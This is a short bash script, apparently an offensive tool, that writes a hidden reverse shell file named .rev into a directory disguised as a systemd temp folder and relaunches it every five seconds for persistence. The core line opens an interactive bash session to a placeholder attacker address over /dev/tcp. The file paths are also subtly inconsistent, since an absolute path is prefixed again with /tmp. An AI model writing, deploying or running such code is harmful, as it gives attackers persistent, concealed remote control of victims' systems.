#!/bin/bash
_addr=IP_ADDRESS
_port=PORT

_private=$(find /tmp 2>/dev/null | grep 'systemd-private' | shuf | head -n 1)
[ -z $_private ] && _private='/tmp/.systemd'
mkdir -m 750 -p $_private
cat << END > /tmp/$_private/.rev
#!/bin/bash
bash -i >& /dev/tcp/$_addr/$_port 0>&1
END

while true; do
    bash /tmp/$_private/.rev
    sleep 5s
done